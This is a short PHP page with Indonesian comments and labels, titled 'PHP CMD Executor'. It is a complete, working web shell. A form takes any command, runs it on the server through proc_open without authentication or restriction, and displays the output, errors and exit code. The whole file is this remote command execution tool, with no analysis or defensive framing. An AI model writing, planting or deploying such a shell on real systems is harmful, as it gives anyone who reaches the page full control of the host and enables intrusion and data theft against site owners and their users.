<?php
$output = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];

    // Descriptor untuk STDIN, STDOUT, STDERR
    $descriptorspec = [
        0 => ["pipe", "r"],  // stdin
        1 => ["pipe", "w"],  // stdout
        2 => ["pipe", "w"]   // stderr
    ];

    // Buka proses dengan perintah
    $process = proc_open($command, $descriptorspec, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]); // Kita tidak kirim ke stdin

        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        $output = "<strong>Output:</strong><br><pre>" . htmlspecialchars($stdout) . "</pre>";
        if (!empty($stderr)) {
            $output .= "<strong>Error:</strong><br><pre style='color:red'>" . htmlspecialchars($stderr) . "</pre>";
        }
        $output .= "<strong>Exit Code:</strong> $return_value";
    } else {
        $output = "<p style='color:red'>Gagal membuka proses.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PHP CMD Executor</title>
</head>
<body style="font-family: monospace; background: #f4f4f4; padding: 20px;">
    <h2>Eksekusi Perintah CMD via PHP</h2>
    <form method="post">
        <label for="command">Masukkan Perintah CMD:</label><br>
        <input type="text" name="command" id="command" style="width: 400px;" required>
        <button type="submit">Jalankan</button>
    </form>
    <hr>
    <?= $output ?>
</body>
</html>
